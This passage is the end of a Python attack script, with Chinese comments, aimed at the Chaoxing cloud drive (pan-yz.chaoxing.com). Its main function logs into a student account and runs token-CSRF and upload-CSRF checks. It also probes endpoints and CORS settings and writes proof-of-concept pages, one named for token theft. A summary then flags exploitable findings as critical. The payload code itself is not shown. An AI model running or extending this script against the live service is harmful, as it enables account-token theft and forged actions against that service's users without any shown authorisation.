            print(f"│   !!!CRITICAL!!! {path}: CSRF可利用                               │")

    # CORS
    print("│                                                                     │")
    print("│ CORS配置:                                                           │")
    for domain, val in results.get("cors_check", {}).items():
        if isinstance(val, dict) and val.get("misconfigured"):
            print(f"│   ***CORS*** {domain}: CORS配置错误                                │")
            if val.get("acac") == "true":
                print(f"│   !!!CRITICAL!!! {domain}: 允许跨域凭证                            │")

    print("├─────────────────────────────────────────────────────────────────────┤")
    print("│ PoC文件:                                                            │")
    print("│   /workspace/poc_cloud_drive_token_theft.html                       │")
    print("│   /workspace/poc_cloud_drive_upload_csrf.html                       │")
    print("│   /workspace/poc_sign_in_csrf.html                                  │")
    print("│   /workspace/poc_cloud_drive_comprehensive.html                     │")
    print("└─────────────────────────────────────────────────────────────────────┘")

    # 保存JSON结果
    result_path = "/workspace/csrf_verification_results.json"
    with open(result_path, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"\n详细结果已保存至: {result_path}")

# ============================================================
# 主函数
# ============================================================
def main():
    sep("超星云盘 CSRF 漏洞深度验证")
    print(f"  时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  目标: pan-yz.chaoxing.com")

    # 登录学生账号
    sub("登录学生账号")
    student_session, student_puid = login(STUDENT_PHONE, STUDENT_PWD)
    if not student_puid:
        print("  错误: 学生账号登录失败!")
        return
    print(f"  学生PUID: {student_puid}")

    # Part 1: Token CSRF
    token_data = verify_token_csrf(student_session, student_puid)

    # Part 2: Upload CSRF
    verify_upload_csrf(student_session, student_puid)

    # Part 3: Token能力
    explore_token_capabilities(student_session, token_data)

    # Part 4: 端点探索
    explore_pan_endpoints(student_session, student_puid)

    # Part 5: 生成PoC
    generate_poc_files()

    # Part 6: CORS检查
    check_cors(student_session)

    # 汇总
    print_summary()

if __name__ == "__main__":
    main()
